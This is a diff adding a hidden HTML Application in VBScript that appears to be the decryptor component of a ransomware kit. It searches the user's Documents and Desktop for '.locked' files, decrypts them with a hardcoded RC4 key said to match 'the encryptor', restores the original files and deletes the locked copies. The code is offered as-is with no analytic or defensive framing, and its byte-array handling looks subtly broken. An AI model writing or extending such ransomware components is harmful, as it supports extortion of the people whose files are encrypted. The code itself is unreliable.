@@ -1,0 +1,68 @@
+<html>
+<head><HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no"/></head>
+<body>
+<script language="VBScript">
+Dim KEY, EXT, TARGETS
+KEY     = "S3cr3tK3y"                    ' MUST match the encryptor
+EXT     = ".locked"
+TARGETS = Array("%USERPROFILE%\Documents", "%USERPROFILE%\Desktop")
+
+Sub Window_OnLoad
+  Set sh = CreateObject("WScript.Shell")
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  For Each t In TARGETS
+    p = sh.ExpandEnvironmentStrings(t)
+    If fso.FolderExists(p) Then Recurse fso.GetFolder(p)
+  Next
+  MsgBox "Decryption complete.", 64, "Done"
+  self.close
+End Sub
+
+Sub Recurse(folder)
+  On Error Resume Next
+  For Each f In folder.Files
+    If Right(LCase(f.Path), Len(EXT)) = LCase(EXT) Then DecryptFile f.Path
+  Next
+  For Each s In folder.SubFolders
+    Recurse s
+  Next
+End Sub
+
+Sub DecryptFile(path)
+  On Error Resume Next
+  Set s = CreateObject("ADODB.Stream")
+  s.Type = 1: s.Open
+  s.LoadFromFile path
+  data = s.Read
+  s.Close
+  dec = RC4Bytes(data)
+  orig = Left(path, Len(path) - Len(EXT))
+  Set s = CreateObject("ADODB.Stream")
+  s.Type = 1: s.Open
+  s.Write dec
+  s.SaveToFile orig, 2
+  s.Close
+  CreateObject("Scripting.FileSystemObject").DeleteFile path, True
+End Sub
+
+Function RC4Bytes(data)
+  Dim S(255), i, j, t, k, outArr()
+  For i = 0 To 255: S(i) = i: Next
+  j = 0
+  For i = 0 To 255
+    j = (j + S(i) + Asc(Mid(KEY, (i Mod Len(KEY)) + 1, 1))) Mod 256
+    t = S(i): S(i) = S(j): S(j) = t
+  Next
+  i = 0: j = 0
+  ReDim outArr(UBound(data))
+  For k = 0 To UBound(data)
+    i = (i + 1) Mod 256
+    j = (j + S(i)) Mod 256
+    t = S(i): S(i) = S(j): S(j) = t
+    outArr(k) = data(k) Xor S((S(i) + S(j)) Mod 256)
+  Next
+  RC4Bytes = outArr
+End Function
+</script>
+</body>
+</html>
